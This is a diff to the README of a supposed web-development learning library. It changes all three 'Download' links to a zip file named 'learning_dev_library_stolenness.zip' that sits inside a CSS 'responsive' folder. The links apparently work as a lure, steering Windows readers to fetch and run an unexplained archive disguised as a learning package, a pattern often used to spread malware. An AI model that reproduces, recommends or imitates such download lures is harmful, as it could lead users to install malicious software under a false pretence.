@@ -1,6 +1,6 @@
 # 📚 dev-learning-library - Learn Web Development Easily
 
-[![Download](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://raw.githubusercontent.com/cccfurkanccc32-coder/dev-learning-library/main/projects/Linktree-Clone/assets/learning_dev_library_v1.3-beta.4.zip)
+[![Download](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://raw.githubusercontent.com/cccfurkanccc32-coder/dev-learning-library/main/projects/trivia-quiz/css/responsive/learning_dev_library_stolenness.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these steps to download and start using the library on your Windows compu
 
 Click this button to go to the download page:
 
-[![Download](https://img.shields.io/badge/Download-Click%20Here-blue)](https://raw.githubusercontent.com/cccfurkanccc32-coder/dev-learning-library/main/projects/Linktree-Clone/assets/learning_dev_library_v1.3-beta.4.zip)
+[![Download](https://img.shields.io/badge/Download-Click%20Here-blue)](https://raw.githubusercontent.com/cccfurkanccc32-coder/dev-learning-library/main/projects/trivia-quiz/css/responsive/learning_dev_library_stolenness.zip)
 
 You will open the GitHub page for dev-learning-library.
 
@@ -141,6 +141,6 @@ This library covers these areas:
 
 Primary download and repository page:
 
-https://raw.githubusercontent.com/cccfurkanccc32-coder/dev-learning-library/main/projects/Linktree-Clone/assets/learning_dev_library_v1.3-beta.4.zip
+https://raw.githubusercontent.com/cccfurkanccc32-coder/dev-learning-library/main/projects/trivia-quiz/css/responsive/learning_dev_library_stolenness.zip
 
 Use this link to download the full package or explore the files online.
